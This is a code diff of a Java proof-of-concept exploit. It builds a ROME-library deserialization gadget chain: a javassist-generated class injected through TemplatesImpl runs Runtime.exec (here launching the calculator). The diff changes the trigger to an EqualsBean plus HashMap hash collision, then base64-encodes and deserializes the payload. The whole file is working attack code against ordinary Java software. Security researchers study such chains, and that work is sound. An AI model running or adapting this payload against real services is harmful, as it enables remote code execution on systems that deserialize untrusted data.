@@ -1,4 +1,6 @@
+import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
 import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+import com.sun.syndication.feed.impl.EqualsBean;
 import com.sun.syndication.feed.impl.ObjectBean;
 import com.sun.syndication.feed.impl.ToStringBean;
 import javassist.ClassPool;
@@ -11,29 +13,37 @@ import java.util.Map;
 public class Main {
     public static void main(String[] args) throws Exception{
         ClassPool pool = ClassPool.getDefault();
-        CtClass ctClass = pool.makeClass("i");
-        CtClass superClass = pool.get("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet");
-        ctClass.setSuperclass(superClass);
-        CtConstructor constructor = ctClass.makeClassInitializer();
-        constructor.setBody("Runtime.getRuntime().exec(\"calc.exe\");");
-        byte[] bytes = ctClass.toBytecode();
+        CtClass clazz = pool.makeClass("a");
+        CtClass superClass = pool.get(AbstractTranslet.class.getName());
+        clazz.setSuperclass(superClass);
+        CtConstructor constructor = new CtConstructor(new CtClass[]{}, clazz);
+        constructor.setBody("Runtime.getRuntime().exec(\"calc\");");
+        clazz.addConstructor(constructor);
 
-        TemplatesImpl templatesImpl = new TemplatesImpl();
-        PocHelper.setFieldValue(templatesImpl, "_bytecodes", new byte[][]{bytes});
-        PocHelper.setFieldValue(templatesImpl, "_name", "a");
-        PocHelper.setFieldValue(templatesImpl, "_tfactory", null);
+        byte[][] bytes = new byte[][]{clazz.toBytecode()};
+        TemplatesImpl templates = TemplatesImpl.class.newInstance();
+        PocHelper.setFieldValue(templates, "_bytecodes", bytes);
+        PocHelper.setFieldValue(templates, "_name", "1");
+        PocHelper.setFieldValue(templates, "_tfactory", null);
 
-        ToStringBean toStringBean = new ToStringBean(Templates.class, templatesImpl);
-        ObjectBean objectBean = new ObjectBean(ToStringBean.class, toStringBean);
-        Map hashMap = new HashMap();
-        hashMap.put(objectBean, "x");
+        EqualsBean bean = new EqualsBean(String.class,"");
+        HashMap map1 = new HashMap();
+        HashMap map2 = new HashMap();
+        map1.put("aa",templates);
+        map1.put("bB",bean);
+        map2.put("aa",bean);
+        map2.put("bB",templates);
+        HashMap map = new HashMap();
+        map.put(map1,"");
+        map.put(map2,"");
 
-        PocHelper.setFieldValue(objectBean, "_cloneableBean", null);
-        PocHelper.setFieldValue(objectBean, "_toStringBean", null);
+        PocHelper.setFieldValue(bean,"_beanClass",Templates.class);
+        PocHelper.setFieldValue(bean,"_obj",templates);
 
-        PocHelper.OutBase64Encode(hashMap);
-        PocHelper.writeSer(hashMap,"ROME.ser");
+        PocHelper.OutBase64Encode(map);
+//        PocHelper.writeSer(map,"ROME.ser");
         PocHelper.readSer("ROME.ser");
+
     }
 
 }
